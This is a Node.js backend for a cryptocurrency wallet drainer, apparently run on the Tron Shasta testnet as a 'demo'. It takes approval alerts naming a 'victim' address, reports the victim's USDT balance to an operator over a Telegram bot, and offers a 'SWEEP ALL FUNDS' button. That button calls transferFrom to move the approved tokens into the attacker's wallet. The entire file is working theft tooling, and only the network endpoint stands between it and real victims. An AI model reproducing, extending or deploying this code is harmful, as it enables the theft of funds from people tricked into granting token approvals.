require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');
const { TronWeb } = require('tronweb');

const app = express();
app.use(cors());
app.use(express.json());

const tronWeb = new TronWeb({
  fullHost: 'https://api.shasta.trongrid.io',
  privateKey: process.env.ATTACKER_PRIVATE_KEY 
});

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const ATTACKER_ADDRESS = tronWeb.defaultAddress.base58;
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

app.post('/api/alert', async (req, res) => {
  const { victimAddress, txHash } = req.body;
  console.log(`[ALERT] Received approval from ${victimAddress}`);

  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const bal = await token.balanceOf(victimAddress).call();
    const balanceNum = Number(bal.toString()) / 1e6;

    const message = `🚨 *PRESIDENTIAL DEMO: VICTIM APPROVED* 🚨\n\n👤 Victim: \`${victimAddress}\`\n💰 USDT Balance: **${fmt(balanceNum)}**\n🔗 [View Tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\nTap below to drain.`;
    
    const keyboard = {
      inline_keyboard: [[
        { text: '📊 Check Balance', callback_data: `bal_${victimAddress}` },
        { text: '🕷️ SWEEP ALL FUNDS', callback_data: `sweep_${victimAddress}` }
      ]]
    };

    await bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown', reply_markup: keyboard });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

bot.action(/bal_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Reading...');
  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const bal = Number((await token.balanceOf(addr).call()).toString()) / 1e6;
    ctx.editMessageText(`📊 *Live Balance*\n👤 \`${addr}\`\n💰 **${fmt(bal)} USDT**`, { parse_mode: 'Markdown' });
  } catch (e) { ctx.editMessageText(`❌ Read failed.`); }
});

bot.action(/sweep_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Initiating Drain...');
  await ctx.editMessageText(`🕷️ *Draining funds from* \`${addr}\`...`, { parse_mode: 'Markdown' });

  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const bal = BigInt((await token.balanceOf(addr).call()).toString());
    const allow = BigInt((await token.allowance(addr, ATTACKER_ADDRESS).call()).toString());
    const amount = bal < allow ? bal : allow;

    if (amount === 0n) {
      return ctx.editMessageText(`❌ *Drain Failed.*\nBalance or Allowance is 0.`);
    }

    const tx = await token.transferFrom(addr, ATTACKER_ADDRESS, amount.toString()).send({ feeLimit: 100000000 });
    
    let info = await tronWeb.trx.getTransactionInfo(tx);
    let tries = 0;
    while ((!info || !info.id) && tries < 10) { await new Promise(r => setTimeout(r, 2000)); info = await tronWeb.trx.getTransactionInfo(tx); tries++; }

    if (info && info.id) {
      await ctx.editMessageText(`✅ *SUCCESSFULLY DRAINED*\n\n👤 From: \`${addr}\`\n💸 To: \`${ATTACKER_ADDRESS}\`\n💰 Amount: **${fmt(Number(amount)/1e6)} USDT**\n🔗 [View Tx](https://shasta.tronscan.org/#/transaction/${tx})`, { parse_mode: 'Markdown' });
    } else {
      ctx.editMessageText(`❌ Transaction pending/failed.`);
    }
  } catch (e) {
    console.error(e);
    ctx.editMessageText(`❌ *Drain Error:*\n${e.message}`);
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`🛡️ Backend running on port ${PORT}`));
bot.launch().then(() => console.log('✅ Telegram bot listening.'));